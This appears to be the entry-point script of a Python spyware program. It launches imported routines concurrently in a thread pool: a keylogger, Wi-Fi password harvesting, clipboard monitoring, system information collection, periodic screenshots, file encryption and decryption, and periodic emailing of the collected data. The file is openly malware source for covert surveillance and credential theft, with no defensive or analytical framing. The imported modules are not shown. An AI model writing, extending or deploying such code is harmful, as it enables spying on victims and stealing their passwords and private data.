from concurrent.futures import ThreadPoolExecutor

# Import functions from modularized components
from data_collection import computer_information, keylogger, wifi_passwords, copy_clipboard
from screenshot_capture import periodic_screenshot_capture
from send_email import send_emails_periodically
from encrypt_and_decrypt import encrypt_files, decrypt_files

def start_program():
    """Starts the program by executing tasks concurrently using ThreadPoolExecutor."""
    with ThreadPoolExecutor(max_workers=8) as executor:
        executor.submit(computer_information)  # Collect system information
        executor.submit(wifi_passwords)       # Gather Wi-Fi credentials
        executor.submit(keylogger)            # Log keystrokes
        executor.submit(copy_clipboard)       # Monitor and log clipboard content
        executor.submit(encrypt_files)        # Encrypt files periodically
        executor.submit(decrypt_files)        # Decrypt files when needed
        executor.submit(periodic_screenshot_capture, 1)  # Capture screenshots at intervals
        executor.submit(send_emails_periodically)        # Send periodic emails with collected data

if __name__ == "__main__":
    # Entry point for the program
    start_program()
